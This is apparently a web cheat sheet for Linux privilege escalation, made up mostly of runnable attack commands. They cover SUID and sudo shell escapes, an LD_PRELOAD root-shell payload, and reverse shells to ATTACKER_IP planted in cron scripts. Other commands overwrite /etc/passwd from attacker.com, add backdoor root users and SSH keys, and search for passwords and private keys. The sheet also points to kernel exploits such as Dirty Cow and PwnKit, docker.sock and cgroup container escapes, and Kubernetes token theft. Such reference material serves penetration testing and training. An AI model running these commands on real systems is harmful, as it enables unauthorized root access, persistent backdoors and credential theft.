#  Sudo, SUID, Capabilities

Linux privilege escalation commands for sudo, SUID, capabilities, cron, containers and restricted shells, plus local console password recovery.

**What is Linux Privilege Escalation?**

Linux privilege escalation crosses a user or service boundary through misconfiguration or a vulnerable component. Useful leads include privileged executables, writable files consumed by privileged jobs and delegated command rights. Verify ownership, execution context and actual write access before treating a discovery as an escalation path.

Enumeration output must be interpreted with the effective UID, groups and namespace context. Kernel version strings alone do not establish exploitability.

Basic identity and kernel info

```
id && whoami && hostname && uname -a
```

List login-capable users

```
cat /etc/passwd | grep -v nologin | grep -v false
```

List sudo privileges for current user — key privesc starting point

```
sudo -l
```

List all cron jobs

```
cat /etc/crontab && ls -la /etc/cron.*
```

Find all SUID binaries

```
find / -perm -u=s -type f 2>/dev/null
```

Find all SGID binaries



```
find / -perm -g=s -type f 2>/dev/null
```

Find binaries with Linux capabilities set

AskCopy

```
getcap -r / 2>/dev/null
```

Find world-writable files

AskCopy

```
find / -writable -type f 2>/dev/null | grep -v proc
```

Check environment variables and shell history

AskCopy

```
env && cat ~/.bash_history && cat ~/.bashrc
```

Kernel version for exploit research

AskCopy

```
cat /proc/version && cat /etc/issue && uname -r
```

Running processes owned by root

AskCopy

```
ps aux | grep root
```

Listening ports — internal services not exposed externally

AskCopy

```
ss -tlnp && netstat -tlnp 2>/dev/null
```

Search readable config files for passwords

AskCopy

```
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

Search a directory recursively for password references

AskCopy

```
grep -Rni "password" /var/www 2>/dev/null
```

Read sudoers file if accessible

AskCopy

```
cat /etc/sudoers 2>/dev/null && cat /etc/sudoers.d/* 2>/dev/null
```

Check home directory dotfiles for credentials

AskCopy

```
ls -la /home/*/.*
```

Find SSH private keys

AskCopy

```
find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null
```

find SUID — execute shell with SUID permissions

AskCopy

```
/usr/bin/find . -exec /bin/sh -p \;
```

vim SUID — spawn shell from within vim

AskCopy

```
vim -c ":!/bin/sh"
```

python SUID — exec shell preserving SUID

AskCopy

```
python3 -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```

perl SUID — exec shell

AskCopy

```
perl -e 'exec "/bin/sh";'
```

ruby SUID — exec shell

AskCopy

```
ruby -e 'exec "/bin/sh"'
```

awk SUID — system call to shell

AskCopy

```
awk 'BEGIN {system("/bin/sh")}'
```

less SUID — escape to shell via ! command

AskCopy

```
less /etc/passwd
!/bin/sh
```

nmap (old versions) SUID interactive mode shell escape

AskCopy

```
nmap --interactive
nmap> !sh
```

bash SUID — -p flag preserves effective UID

AskCopy

```
bash -p
```

cp SUID — copy bash with SUID bit, then execute it

AskCopy

```
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
/tmp/rootbash -p
```

tar SUID — checkpoint action to execute shell

AskCopy

```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

node SUID — spawn shell

AskCopy

```
node -e "require('child_process').spawn('/bin/sh', {
  stdio: [0,1,2]
})"
```

env SUID — preserve effective UID

AskCopy

```
env /bin/sh -p
```

strace SUID — run shell under strace, preserving SUID

AskCopy

```
strace -o /dev/null /bin/sh -p
```

tclsh SUID — exec shell with I/O redirection

AskCopy

```
tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
```

NOPASSWD vim — open shell from vim command mode

AskCopy

```
# sudo -l output → (root) NOPASSWD: /bin/vim
sudo vim -c ":!/bin/bash"
```

NOPASSWD find — execute shell via -exec

AskCopy

```
# sudo -l → (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
```

NOPASSWD python3 — system call to bash

AskCopy

```
# sudo -l → (root) NOPASSWD: /usr/bin/python3
sudo python3 -c "import os; os.system('/bin/bash')"
```

NOPASSWD less — shell escape via ! in less pager

AskCopy

```
# sudo -l → (root) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
!/bin/sh
```

Sudo -u#-1 bypass (CVE-2019-14287) — sudo &lt; 1.8.28

AskCopy

```
# sudo -l → (ALL, !root) /bin/bash
# CVE-2019-14287: sudo < 1.8.28 bypass
sudo -u#-1 /bin/bash
```

LD_PRELOAD abuse — requires env_keep in sudoers

AskCopy

```
# LD_PRELOAD trick (requires env_keep += LD_PRELOAD in sudoers)
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so <allowed_command>
```

NOPASSWD wget — overwrite /etc/passwd

AskCopy

```
# sudo -l → (root) NOPASSWD: /usr/bin/wget
sudo wget http://attacker.com/passwd -O /etc/passwd
```

NOPASSWD tee — append new root user to /etc/passwd

AskCopy

```
# sudo -l → (root) NOPASSWD: /usr/bin/tee
echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
```

Script path hijacking — inject into sourced file

AskCopy

```
# sudo -l → (root) /bin/bash /path/to/script.sh
# If script sources a file in a writable dir:
echo "bash -i" > /writable/path/sourced.sh
```

NOPASSWD git — pager escape to shell

AskCopy

```
# sudo -l → (root) NOPASSWD: /usr/bin/git
sudo git -p help config
!/bin/sh
```

NOPASSWD zip — unzip-command shell escape

AskCopy

```
# sudo -l → (root) NOPASSWD: /usr/bin/zip
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/sh"
```

NOPASSWD apt-get — Pre-Invoke hook to shell

AskCopy

```
# sudo -l → (root) NOPASSWD: /usr/bin/apt-get
sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
```

Enumerate all cron jobs — look for writable scripts

AskCopy

```
cat /etc/crontab
crontab -l
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
cat /var/spool/cron/crontabs/*
```

Append reverse shell to world-writable cron script

AskCopy

```
# If cron runs /opt/cleanup.sh as root and file is world-writable:
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/cleanup.sh
```

PATH hijacking — cron uses relative command name

AskCopy

```
# If cron uses relative PATH and /tmp is writable:
# crontab: * * * * * backup.sh
export PATH=/tmp:$PATH
echo "#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /tmp/backup.sh
chmod +x /tmp/backup.sh
```

tar wildcard injection via checkpoint flags

AskCopy

```
# Wildcard injection in cron tar command:
# * * * * * root tar czf /backup.tgz /opt/data/*
cd /opt/data
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh revshell.sh"
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > revshell.sh
chmod +x revshell.sh
```

Write new root cron job if cron.d is writable

AskCopy

```
# Writable cron.d directory:
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /etc/cron.d/backdoor
```

Add new root user to writable /etc/passwd

AskCopy

```
# /etc/passwd writable → add new root user
echo "hacker:$(openssl passwd -1 -salt xyz hacked):0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker  # password: hacked
```

Replace root hash in writable /etc/shadow

AskCopy

```
# /etc/shadow writable → replace root password hash
python3 -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHOD_SHA512)))"
# Replace root hash in /etc/shadow
```

Add NOPASSWD ALL to writable sudoers

AskCopy

```
# /etc/sudoers writable → add NOPASSWD rule
echo "$(id -un) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash
```

Find root-owned world-writable files

AskCopy

```
# Find files owned by root but writable by current user:
find / -user root -writable -type f 2>/dev/null | grep -v proc
```

Append SSH public key to root authorized_keys

AskCopy

```
# Append SSH key to root authorized_keys (if ~/.ssh writable):
mkdir -p /root/.ssh
echo "<your_public_key>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

Enumerate and understand dangerous capabilities

AskCopy

```
# Find capabilities:
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid+ep → set UID to 0
# cap_net_raw+ep → raw socket access
# cap_sys_admin+ep → near-root
# cap_dac_read_search+ep → bypass file read checks
```

python3 cap_setuid — set UID to 0 and spawn bash

AskCopy

```
# python3 with cap_setuid+ep:
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

perl cap_setuid — escalate to root

AskCopy

```
# perl with cap_setuid+ep:
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

vim cap_setuid — use Python to setuid and spawn shell

AskCopy

```
# vim with cap_setuid+ep:
vim -c ":py3 import os; os.setuid(0); os.execl('/bin/bash', 'bash', '-p')"
```

node cap_setuid — set UID to 0 and spawn shell

AskCopy

```
# node with cap_setuid+ep:
node -e "process.setuid(0); require('child_process').spawn('/bin/bash', {stdio: [0,1,2]})"
```

tar cap_dac_read_search — read /etc/shadow

AskCopy

```
# tar with cap_dac_read_search — read any file:
tar xf /etc/shadow -I cat
```

openssl cap_setuid — load malicious engine to escalate

AskCopy

```
# openssl with cap_setuid:
openssl req -engine /tmp/evil.so
```

Dirty Cow CVE-2016-5195 — overwrite /etc/passwd via PTRACE_POKETEXT

AskCopy

```
# Dirty Cow (CVE-2016-5195) — kernel < 4.8.3
# Overwrite any file (e.g., /etc/passwd)
wget https://github.com/firefart/dirtycow/raw/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty <password>
# Creates /etc/passwd entry for firefart:password with root UID
```

Dirty Pipe CVE-2022-0847 — overwrite SUID binaries to add shell backdoor

AskCopy

```
# Dirty Pipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
# Overwrite read-only files
# PoC: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
./exploit /usr/bin/sudo
```

PwnKit CVE-2021-4034 — pkexec out-of-bounds write → root

AskCopy

```
# PwnKit (CVE-2021-4034) — pkexec privilege escalation
# Affects polkit pkexec 0.105 and earlier (most distros before Jan 2022)
# PoC: https://github.com/ly4k/PwnKit
./PwnKit  # spawns root shell
```

overlayfs CVE-2023-0386 — FUSE + overlayfs SUID file bypass

AskCopy

```
# overlayfs (CVE-2023-0386) — kernel < 6.2
# Unprivileged user namespace + overlayfs to escalate
# PoC: https://github.com/xkaneiki/CVE-2023-0386
./poc
```

linux-exploit-suggester.sh — match kernel version to known exploits

AskCopy

```
# Automated kernel exploit suggester:
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
bash linux-exploit-suggester.sh

# Alternatively, run on local machine:
bash les.sh --kernelmode --uname "$(uname -r)"
```

Detect Docker container and check if privileged

AskCopy

```
# Check if inside Docker:
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Check if privileged:
cat /proc/self/status | grep -i cap
# CapEff: 0000003fffffffff = full capabilities (privileged)
```

Privileged container: mount host drive and chroot

AskCopy

```
# Privileged container — mount host filesystem:
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
# Now in root shell on host filesystem
```

docker.sock escape — launch new privileged container with host root mount

AskCopy

```
# Docker socket escape (if /var/run/docker.sock is accessible):
ls -la /var/run/docker.sock

docker run -v /:/host --rm -it ubuntu chroot /host bash
# Spawns root shell on host via new privileged container
```

cgroups v1 notify_on_release RCE as host root

AskCopy

```
# cgroups v1 notify_on_release escape (CVE-2022-0492 style):
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))
mkdir -p $d/w; echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o; echo $t/c > $d/release_agent
echo "#!/bin/sh" > /c; echo "id > $t/o" >> /c; chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1; cat /o
```

K8s service account token — enumerate cluster secrets

AskCopy

```
# Kubernetes: extract service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to call API server:
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

A remote command may bypass an interactive restricted-shell startup only when SSH policy permits it; it does not bypass a forced command. Replace `USER` and `HOST`.

Discover commands available in the restricted Bash environment

AskCopy

```
compgen -c
```

Request Bash without its interactive startup files

AskCopy

```
ssh -t USER@HOST 'bash --noprofile --norc'
```

Restore a usable PATH after leaving the restricted shell

AskCopy

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

At a Python prompt, `import os; os.system('/bin/bash')` uses the same process identity. The Python example under Sudo Misconfigurations gains privileges only when sudo policy grants them. Reuse the existing tar checkpoint example under SUID / SGID Binaries when that executable is available. Sources: [Bash restricted-shell behavior](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html), [OpenSSH client](https://man.openbsd.org/ssh).

Requires console access, permission to edit the GRUB boot entry, and an accessible root filesystem. Disk encryption still requires its unlock secret. In GRUB, press `e`, retain the existing kernel/root parameters, replace `ro` with `rw`, and append `init=/bin/bash` to the `linux` line. Boot the temporary entry with Ctrl-X or F10.

Kernel parameters in the GRUB entry, not a shell command

AskCopy

```
rw init=/bin/bash
```

Reset a local account from the recovery root shell

AskCopy

```
mount -o remount,rw /
passwd USERNAME
sync
mount -o remount,ro /
/sbin/reboot -f
```

Boot normally afterward; the edited entry is temporary. Initramfs, separate filesystems, or SELinux can require the distribution's recovery procedure. Sources: [GRUB editing](https://www.gnu.org/software/grub/manual/grub/grub.html), [Linux kernel parameters](https://docs.kernel.org/admin-guide/kernel-parameters.html).

[

PreviousKerberos Attacks

](https://hacking-notes.jord4n.pro/cheat-sheets/systems-active-directory/kerberos-attacks)[

NextWindows Privilege Escalation

](https://hacking-notes.jord4n.pro/cheat-sheets/systems-active-directory/windows-privilege-escalation)

Last updated 9 days ago

Linux Privilege Escalation Cheat Sheet: Sudo, SUID, Capabilities | Hacking Notes Jordan